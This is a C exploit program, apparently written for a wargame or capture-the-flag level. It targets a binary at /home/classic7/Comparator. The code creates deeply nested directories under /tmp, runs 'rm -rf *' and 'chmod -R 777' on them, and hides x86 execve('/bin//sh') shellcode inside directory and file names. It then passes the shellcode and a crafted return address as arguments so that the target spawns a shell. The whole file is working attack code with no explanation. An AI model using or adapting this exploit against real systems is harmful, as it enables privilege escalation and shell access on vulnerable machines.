#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>


char getchar_int(int a, int pos)
{
    return (a>>(8*pos))&0xff;
}

int string_to_int(char str[4])
{
    int ret = 0, i = 0;
    for(;i<4;i++)
        ret += (((int)str[i]+1)<<(8*i));
    return ret;
}

void int_to_string(int a, char str[4])
{
    int i = 0;
    for(;i<4;i++)
        str[i] = getchar_int(a,i);
}

int main()
{
    char str[5] = "\xc8\xee\xff\xff";

    system("mkdir -p /tmp/b/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc/dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee/ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff/gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg/hhhhhh");
    char* root = "/tmp/b/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc/dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee/ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff/gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg/hhhhhh";
    chdir(root);
    system("chmod -R 777 /tmp/b");


    chdir(root);
    system("rm -rf *");

    char cmd[30] = "mkdir ";
    strcat(cmd, str);
    system(cmd);
    printf("Return of system : %d\n",system(cmd));
    chdir(str);
    system("touch a");
    system("mkdir -p \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f");
    chdir("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f");
    system("touch \x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80");
    chdir(root);
    system("chmod -R 777 *");
    chdir(str);

    char* argv[] = {"/home/classic7/Comparator","a","\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80",NULL};
    if(execve("/home/classic7/Comparator",argv,NULL)<0)
    {
        printf("Error exec\n");
        return -1;
    }

    return 0;
}
